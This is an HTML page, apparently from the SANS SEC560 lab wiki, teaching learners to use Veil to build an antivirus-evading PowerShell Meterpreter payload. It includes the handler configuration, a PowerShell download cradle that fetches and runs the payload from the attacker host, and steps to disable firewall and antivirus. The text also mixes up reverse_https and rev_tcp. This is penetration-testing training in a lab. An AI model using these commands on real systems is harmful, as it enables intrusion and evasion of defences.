@@ -1,0 +1,523 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-33-veil">Lab 3.3: Veil</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>Using Veil to explore its feature set</li>
+<li>Learning how to use Veil to build payloads that can evade various antivirus tools</li>
+</ul>
+<p>In the lab, you&rsquo;ll run Veil and configure it to create a Metasploit-compatible payload in a Windows <code>.bat</code> file. When this <code>.bat</code> file runs, it launches Windows PowerShell to build a Meterpreter stager with the <code>reverse_https</code> stager in the memory of the target machine where it runs. Because the Meterpreter gets loaded into memory by PowerShell from an encoded source in the <code>.bat</code> file, it is less likely to be detected by antivirus tools.</p>
+<p>It is important to note that not every Veil payload dodges every antivirus tool. It is a hit-and-miss situation, which is constantly changing as the antivirus vendors adapt their tools to detect different attacks. We use Meterpreter with the <code>reverse_https</code> stager loaded into memory as an example here to build our skills. When penetration testing, you rely on Veil in the same way by building different payloads and testing each one in the lab against the antivirus tool used by the target environment until you find a payload that evades it.</p>
+<p>In addition to creating the malicious payload, Veil also creates a Metasploit configuration file, which has an <code>.rc</code> suffix. This file automatically prepares Metasploit with <code>multi/handler</code>, which receives an inbound connection when the payload executes on a target machine.</p>
+<p>Later in the lab, you run and configure Metasploit with this <code>.rc</code> file. Once the <code>multit/handler</code> is set up to listen, you can run the malicious payload on your Windows machine and watch as it connects back to your Linux VM, where Metasploit awaits it.</p>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>To conduct this lab, you need to switch your virtual machine environment to use bridged networking.</p>
+<ul>
+<li>In VMware's network configuration, <b>click the radio button marked "Bridged"</b>.</li>
+</ul>
+<p><img  class="myImg"  src="pics/Ex3.3_img01.png" style="width:100%;max-width:600px"  alt="Switched to Bridged networking" /></p>
+<ul>
+<li>Make sure your Windows and Linux machines can ping each other:</li>
+</ul>
+<pre>
+$ <b>ping <i>YOUR_WINDOWS_IP_ADDRESS</i></b>
+</pre>
+
+<pre>
+C:\> <b>ping <i>YOUR_LINUX_IP_ADDRESS</i></b>
+</pre>
+
+<p>If you can ping each successfully using bridged networking, you are ready to begin.</p>
+<p>If you cannot ping Windows, it is possible Windows Firewall is blocking the traffic. Disable Windows Firewall by running (at an elevated command prompt):</p>
+<pre>
+C:\> <b>netsh advfirewall set allprofiles state off</b>
+</pre>
+
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<h4 id="1-launching-veil">1. Launching Veil</h4>
+<p>Let's start by running Veil. We've created a script for you that will <code>cd</code> into the correct directory and execute Veil.py. To launch Veil, execute the command below:</p>
+<pre>
+$ <b>sudo veil</b>
+</pre>
+
+<p>When it launches, it will display its version number, the number of payloads it knows how to generate, and a list of available commands.</p>
+<p>Inside Veil, you can run the <code>list</code> command to get a list of all the different payloads that the tool can generate.</p>
+<p>Let's focus on the <code>Evasion</code> tool for now:</p>
+<pre>
+Veil >: <b>use Evasion</b>
+</pre>
+
+<p>Your output should look similar to this:</p>
+<pre>
+sec560@slingshot:~$ <b>veil</b>
+===============================================================================
+                             Veil | [Version]: 3.1.12
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+Main Menu
+
+    <em>2 tools loaded</em>
+
+Available Tools:
+
+    1)  Evasion
+    2)  Ordnance
+
+Available Commands:
+
+    exit            Completely exit Veil
+    info            Information on a specific tool
+    list            List available tools
+    options         Show Veil configuration
+    update          Update Veil
+    use         Use a specific tool
+
+Veil>: <b>use Evasion</b>
+</pre>
+
+<p>Now let&rsquo;s get a list of the various payloads that Veil can generate.</p>
+<pre>
+Veil/Evasion >: <b>list</b>
+</pre>
+
+<p>Your output should resemble this:</p>
+<pre>
+Veil/Evasion>: <b>list</b>
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+
+ [*] Available Payloads:
+
+    1)  autoit/shellcode_inject/flat.py
+
+    2)  auxiliary/coldwar_wrapper.py
+    3)  auxiliary/macro_converter.py
+    4)  auxiliary/pyinstaller_wrapper.py
+
+    5)  c/meterpreter/rev_http.py
+    6)  c/meterpreter/rev_http_service.py
+    7)  c/meterpreter/rev_tcp.py
+    8)  c/meterpreter/rev_tcp_service.py
+    ... truncated for brevity ...
+</pre>
+
+<p>In the list, you first see a couple of auxiliary modules provided by Veil: <code>auxiliary/coldwar_wrapper</code> and <code>auxiliary/pyinstaller_wrapper</code>. The <code>coldwar_wrapper</code> module takes a Windows EXE file and converts it to a Web Archive (WAR) file for execution in a Java Runtime environment. The <code>pyinstaller_wrapper</code> takes a Python program and converts it to a Windows executable using the <code>pyinstaller</code> application. Each of those techniques can help evade some antivirus tools.</p>
+<p>Next, we have groupings of payloads based on the programming language used to generate the payload. In the list, you see <code>c</code>, <code>cs</code> (which is for <code>C#</code>, also known as "C Sharp"), <code>go</code>, <code>lua</code>, <code>powershell</code>, <code>python</code>, <code>ruby</code>, etc. You can see more details about the given payload, often including a stage (such as <code>meterpreter</code> or <code>shellcode_inject</code>) and a stager (such as <code>rev_tcps</code>). Veil can use each of these languages to build a payload that may dodge various antivirus tools.</p>
+<p>In the list, note item number 22: <code>powershell/meterpreter/rev_tcp</code>. Let&rsquo;s get more information about that payload.</p>
+<p>To get more information about any of the payloads included in Veil, use the <code>info</code> command. Let's try that by getting more information about the <code>powershell/meterpreter/rev_tcp</code> payload:</p>
+<pre>
+Veil/Evasion>: <b>info powershell/meterpreter/rev_tcp.py</b>
+</pre>
+
+<p>Results:</p>
+<pre>
+Veil/Evasion>: <b>info powershell/meterpreter/rev_tcp.py</b>
+
+Payload: powershell/meterpreter/rev_tcp selected
+
+ Required Options:
+
+Name                Value       Description
+----                -----       -----------
+BADMACS             FALSE       Checks for known bad mac addresses
+DOMAIN              X           Optional: Required internal domain
+HOSTNAME            X           Optional: Required system hostname
+LHOST                           IP of the Metasploit handler
+LPORT               4444        Port of the Metasploit handler
+MINBROWSERS         FALSE       Minimum of 2 browsers
+MINPROCESSES        X           Minimum number of processes running
+MINRAM              FALSE       Require a minimum of 3 gigs of RAM
+PROCESSORS          X           Optional: Minimum number of processors
+SLEEP               X           Optional: Sleep "Y" seconds, check if accelerated
+USERNAME            X           Optional: The required user account
+USERPROMPT          FALSE       Window pops up prior to payload
+UTCCHECK            FALSE       Check that system isn't using UTC time zone
+VIRTUALPROC         FALSE       Check for known VM processes
+</pre>
+
+<p>Here you can see the various options available for this payload. Using these, Veil creates a PowerShell script, which is written into a Windows <code>.bat</code> file that launches PowerShell. The <code>LHOST</code> variable tells Veil where to connect back to for the reverse connection. This connection defaults to connecting back on to the local TCP port (<code>LPORT</code>) of <code>4444</code>.</p>
+<p>We used the <code>info</code> command to pull information about this one specific payload, but it could be used to analyze the details of any of the other payloads supported by Veil.</p>
+<p>Next, we will use Veil to generate a <code>powershell/meterpreter/reverse_tcp</code> payload.</p>
+<h4 id="step-2-exploring-veil">Step 2: Exploring Veil</h4>
+<p>Now let&rsquo;s get a list of commands we have available. Hit <code>Tab</code> twice at the command prompt.</p>
+<pre>
+Veil/Evasion>: <b>&lt;Tab&gt;&lt;Tab&gt;</b>
+</pre>
+
+<p>We can see that we have several commands, including the <code>back</code> command (which will take us back to the original context of Veil), the <code>checkvt</code> command (which will check whether any payloads you&rsquo;ve generated are flagged by Virus Total), the <code>clean</code> command (which removes any previously created payloads), the <code>exit</code> command, the <code>info</code> command, the <code>list</code> command (to get a list of possible payloads), and, finally, the <code>use</code> command. We&rsquo;ll select the payload we want to generate via the <code>use</code> command:</p>
+<pre>
+Veil/Evasion>: <b>use powershell/meterpreter/rev_tcp.py</b>
+</pre>
+
+<blockquote>
+<p>Note that Veil handily shows the configuration options for the module you selected along with available commands. The Veil interface was designed to walk you through, step by step, the creation of the malicious executable.</p>
+</blockquote>
+<p><img  class="myImg"  src="pics/Ex3.3_img05.png" style="width:100%;max-width:600px"  alt="Using rev_tcp" /></p>
+<p>If you&rsquo;d like to see that list of options again (or at any time hereafter), you can run the <code>options</code> command:</p>
+<pre>
+&#91;powershell/meterpreter/rev_tcp>>&#93;: <b>options</b>
+</pre>
+
+<p>The only option we MUST provide is the <b>LHOST</b> option, the machine where the generated payload connects back to. Please set that to your Linux IP address:</p>
+<pre>
+&#91;powershell/meterpreter/rev_tcp>>&#93;: <b>set LHOST <i>YOUR_LINUX_IP_ADDRESS</i></b>
+</pre>
+
+<blockquote>
+<p>Note: Type the IP address of your Linux host instead of <code>YOUR_LINUX_IP_ADDRESS</code>.</p>
+</blockquote>
+<p>With our option set, we can now create the payload file with the <code>generate</code> command:</p>
+<pre>
+&#91;powershell/meterpreter/rev_tcp>>&#93;: <b>generate</b>
+</pre>
+
+<p>You&rsquo;ll now be prompted for the base name to use for the payload and configuration file associated with it. Please enter the name: <b><i>560veil</i></b></p>
+<pre>
+&#91;powershell/meterpreter/rev_tcp>>&#93;: <b>set LHOST <i>YOUR_LINUX_IP_ADDRESS</i></b>
+&#91;powershell/meterpreter/rev_tcp>>&#93;: <b>generate</b>
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ [>] Please enter the base name for output files (default is payload): <b>560veil</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.3_img06.png" style="width:100%;max-width:600px"  alt="Veil entering base name" /></p>
+<p>As Veil generates the payload, it shows the details of what it is creating, including the payload and the files it builds. Note specifically that it creates two files:</p>
+<ul>
+<li><p><code>/var/lib/veil/output/source/560veil.bat</code> &lt;- The payload</p></li>
+<li><p><code>/var/lib/veil/output/handlers/560veil.rc</code> &lt;- This is the Metasploit configuration file (also known as a handler file) for a <code>multi/handler</code> waiting for a connection from our payload.</p></li>
+</ul>
+<p>Now that you&rsquo;ve generated your payload and handler files, press <code>Enter</code> and <code>exit</code> Veil:</p>
+<pre>
+Veil/Evasion>: <b>exit</b>
+</pre>
+
+<p>You should be returned to your underlying shell prompt.</p>
+<h4 id="step-3-examine-the-payload">Step 3: Examine the payload</h4>
+<p>Next, look at the <code>560veil.bat</code> file that Veil generated by changing into its directory and running <code>ls -l</code>:</p>
+<pre>
+$ <b>cd /var/lib/veil/output/source/</b>
+$ <b>ls -l</b>
+total 4
+-rw-r--r-- 1 sec560 sec560 <em>3023</em> Jun  5 22:23 560veil.bat
+</pre>
+
+<p>Here you can see that Veil created a 2287-byte Windows <code>.bat</code> file called <code>560veil.bat</code>. Your file may be a byte or two larger or smaller, depending on your IP address. Now look at its contents:</p>
+<pre>
+$ <b>cat 560veil.bat</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.3_img08.png" style="width:100%;max-width:600px"  alt="Examining the payload" /></p>
+<p>If you look carefully in this file, you can see that it starts by turning off the echoing of commands on the screen (<code>@echo off</code>). It then checks the processor architecture to determine which version of PowerShell to invoke (the <code>x86</code> version or the <code>x64</code> version). When it runs PowerShell, it invokes it with the following options:</p>
+<p><strong><code>-NoP</code></strong>: This option is short for <code>NoProfile</code>, which prevents PowerShell from loading a profile of custom settings.</p>
+<p><strong><code>-NonI</code></strong>: This option prevents PowerShell from displaying an interactive prompt to the user on the screen.</p>
+<p><strong><code>-W Hidden</code></strong>: This option sets the window style for PowerShell to <b>Hidden</b> so that it won&rsquo;t pop up a PowerShell console on the screen. Note that the <code>.bat</code> file that launches PowerShell displays a console, but PowerShell will not.</p>
+<p><strong><code>-Command</code></strong>: And, finally, we have the PowerShell command to be executed. This command will take Base64-encoded text of a stage and stager, load it into memory, and execute it. The remainder of the PowerShell command includes the functionality to achieve that goal.</p>
+<p>In addition to creating the <code>.bat</code> file with the malicious PowerShell payload, Veil also created a handler file to configure Metasploit to wait for the inbound connection. Let&rsquo;s look at that file:</p>
+<pre>
+$ <b>cd /var/lib/veil/output/handlers</b>
+$ <b>ls -l</b>
+total 4
+-rw-r--r-- 1 root root <em>143</em> Jun  5 22:23 560veil.rc
+</pre>
+
+<p>Here we see a short file that is approximately 143 bytes in length (your file may be a byte or two larger because of the different <b>LHOST</b> IP address). Let&rsquo;s look at its contents:</p>
+<pre>
+$ <b>cat 560veil.rc</b>
+</pre>
+
+<p>Results:</p>
+<pre>
+sec560@slingshot:~$ <b>cd /var/lib/veil/output/handlers/</b>
+sec560@slingshot:/var/lib/veil/output/handlers$ <b>ls -l</b>
+total 4
+-rw-r--r-- 1 sec560 sec560 145 Jul  1 17:43 560veil.rc
+sec560@slingshot:/var/lib/veil/output/handlers$ <b>cat 560veil.rc</b>
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.75.102
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+</pre>
+
+<blockquote>
+<p>Your file will be the same, except your <code>LHOST</code> will be different.</p>
+</blockquote>
+<p>This Metasploit <code>.rc</code> file contains a series of commands to configure <code>msfconsole</code>, including:</p>
+<ul>
+<li>Selecting <code>multi/handler</code> as an exploit.</li>
+<li>Setting the payload to a Meterpreter stage and <code>reverse_tcp</code> stager.</li>
+<li>Setting <b>LHOST</b> to your Linux IP address.</li>
+<li>Setting <b>LPORT</b> to <code>4444</code> (the default for that Veil payload).</li>
+<li>Setting <b>ExitOnSession</b> to false. This option keeps <code>multi/handler</code> running even after a session has been created with it. That way, we can still get more sessions opened back to our msfconsole if the payload runs multiple times (perhaps on multiple targets).</li>
+<li>Launching the exploit in a jobified fashion (<code>exploit -j</code>) so that the multi/handler runs in the background, awaiting a connection.</li>
+</ul>
+<h4 id="step-4-launch-metasploit">Step 4: Launch Metasploit</h4>
+<p>Now we&rsquo;ll launch Metasploit and have it read the <code>.rc</code> configuration file.</p>
+<pre>
+$ <b>msfconsole -r /var/lib/veil/output/handlers/560veil.rc</b>
+</pre>
+
+<p>Watch as Metasploit processes the <code>.rc</code> file. You can see it running each command in the file, configuring Metasploit step by step to run the multi/handler and preparing the appropriate payload and options.</p>
+<p>When the <code>.rc</code> file has been processed, look at Metasploit&rsquo;s backgrounded jobs:</p>
+<pre>
+msf5 > <b>jobs</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.3_img10.png" style="width:100%;max-width:600px"  alt="see Metasploits backgrounded jobs" /></p>
+<p>Now look at the settings:</p>
+<pre>
+msf5 > <b>show options</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.3_img10b.png" style="width:100%;max-width:600px"  alt="see Metasploits settings" /></p>
+<p>Metasploit has been automatically configured with all the settings and is now awaiting connections from our malicious payload. We just need to get our Windows machine to run it.</p>
+<p>We have many options for delivering our <code>560veil.bat</code> malicious payload to a Windows machine. For this lab, we'll deliver the file via web download. Other options in a penetration test include email, USB thumb drive, and other social engineering vectors.</p>
+<p>OPEN A NEW TERMINAL WINDOW!</p>
+<p>In the new terminal Window, <code>cd</code> to the directory containing the payload, then launch the Python web server.</p>
+<pre>
+$ <b>cd /var/lib/veil/output/source</b>
+$ <b>python -m http.server</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.3_img10c.png" style="width:100%;max-width:600px"  alt="Launching Python webserver" /></p>
+<p>In Windows, we use a download cradle to download and execute the .bat file. Launch PowerShell and type the following command:</p>
+<pre>
+PS C:\> <b>powershell.exe -exec bypass -noprofile -windowstyle hidden -Command "IEX (New-Object Net.Webclient).downloadstring('http://<i>YOUR_LINUX_IP_ADDRESS</i>:8000/560veil.bat')"</b>
+</pre>
+
+<p>Alternatively, open Edge (this will not work in Chrome) and browse to:</p>
+<pre>
+http://<i>YOUR_LINX_IP_ADDRESS</i>:8000
+</pre>
+
+<p>Click on the <code>560veil.bat</code> file and save it.</p>
+<p><img  class="myImg"  src="pics/Ex3.3_img11.png" style="width:100%;max-width:600px"  alt="Downloading and saving .bat file" /></p>
+<p>Then click "Open folder".</p>
+<p><img  class="myImg"  src="pics/Ex3.3_img12.png" style="width:100%;max-width:600px"  alt="Viewing .bat file" /></p>
+<h4 id="step-5-launch-the-payload">Step 5: Launch the Payload</h4>
+<p>With the <code>560veil.bat</code> file now on your Windows machine, run it. You should double-click it in Windows File Explorer. It may pop up a screen saying that <b>"The publisher of this file could not be verified".</b> Simply select <b>Run</b>.</p>
+<p>And then double-click the file. You will be asked if you want to run the file. Click "Run".</p>
+<p><img  class="myImg"  src="pics/Ex3.3_img15.png" style="width:100%;max-width:600px"  alt="Executing .bat file" /></p>
+<p>While the file is running, you will likely see a window pop up and then disappear. On your Slingshot Linux system, look at the <code>msfconsole</code> screen. You should see an inbound connection from Windows. If you see a session coming in to msfconsole, press <code>Enter</code> on the <code>msfconsole</code> screen to get your <code>msf</code> prompt back.</p>
+<p>If you do not see a session, there is a chance your antivirus tool did detect the malicious file. (In other words, your AV vendor created signatures that work for this specific payload in Veil.) Disable your antivirus tool and try to download and/or run it again.</p>
+<p>When you get a session, you can look at the session details by running:</p>
+<pre>
+msf > <b>sessions -l</b>
+</pre>
+
+<blockquote>
+<p>That&rsquo;s a dash lowercase L for "list", not a one.</p>
+</blockquote>
+<p>You can interact with the session by running <code>session -i</code> followed by the session ID number:</p>
+<pre>
+msf > <b>sessions -i <i>N</i></b>
+</pre>
+
+<blockquote>
+<p>Replace <code>N</code> with your session ID number.</p>
+</blockquote>
+<p>You can run <code>getuid</code> to determine your current user. (It should be the user who is logged in to your Windows GUI because that was how you executed the 560veil.bat file when you double-clicked it.)</p>
+<pre>
+meterpreter > <b>getuid</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.3_img16.png" style="width:100%;max-width:600px"  alt="Meterpreter retrieving sessions and getting uid" /></p>
+<p>You can experiment with this Meterpreter session, running the various commands we discussed during the earlier part of the class. When you finish with the Meterpreter, you can <code>exit</code> it by running:</p>
+<pre>
+meterpreter > <b>exit</b>
+</pre>
+
+<p>If you have extra time, look again at the <code>560veil.bat</code> file on Windows.</p>
+<p>On your Downloads directory, find <code>560veil.bat</code>, <b>right-click</b> it, and select <b>Edit with Notepad++</b>.</p>
+<p><img  class="myImg"  src="pics/Ex3.3_img17.png" style="width:100%;max-width:600px"  alt="Opening .bat file with Notepad++" /></p>
+<p>By default, the long lines do not wrap. To wrap the long lines, click on View | Word wrap.</p>
+<p>Look through this <code>.bat</code> file carefully. You can see the options we discussed earlier:</p>
+<p><strong><code>-NoP</code></strong>: This option is short for <code>NoProfile</code>, which prevents PowerShell from loading a profile of custom settings.</p>
+<p><strong><code>-NonI</code></strong>: This option prevents PowerShell from displaying an interactive prompt to the user on the screen.</p>
+<p><strong><code>-W Hidden</code></strong>: This option sets the window style for PowerShell to <b>Hidden</b> so that it won&rsquo;t pop up a PowerShell console on the screen. Note that the <code>.bat</code> file that launches PowerShell displays a console, but PowerShell will not.</p>
+<p><strong><code>-Command</code></strong>: And, finally, we have the PowerShell command to be executed. This command will take Base64-encoded text of a stage and stager, load it into memory, and execute it. The remainder of the PowerShell command includes the functionality to achieve that goal.</p>
+<p><img  class="myImg"  src="pics/Ex3.3_img18.png" style="width:100%;max-width:600px"  alt="Viewing .bat file" /></p>
+<p>If you have extra time, you can edit the <code>560veil.bat</code> file. Start by removing the <code>-W Hidden</code> from it. (That string will be in two places: one for <code>x86</code> and one for <code>x64</code>.) Please remove both of them and try to rerun it. You see that it creates a persistent console on the screen. You can remove the other PowerShell configuration options to see how each one impacts the payload.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In conclusion, in this lab we used Veil to select and configure a malicious payload as a <code>.bat</code> file that launches PowerShell and uses it to create in memory a Meterpreter stage with a <code>reverse_https</code> stager. These are handy options because most environments allow outbound HTTPS, and this stager even supports grabbing local proxy configurations from the target Windows machine and using them for its HTTPS connection.</p>
+<p>The payload we created has properties that allow it to evade some antivirus tools. In addition to the payload we created, several dozen other payloads in Veil dodge various antivirus tools. As penetration testers, we would likely create payloads in the lab and experiment with each on a system configured with the target organization&rsquo;s antivirus product until we found one that successfully evaded it.</p>
+<p>Also, Veil created a Metasploit configuration file of commands to automatically set up Metasploit to await inbound connections from a victim machine that runs our malicious payload.</p>
+<p>These techniques are useful in penetration testing because they provide a wealth of options for gaining successful code execution on a target environment.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
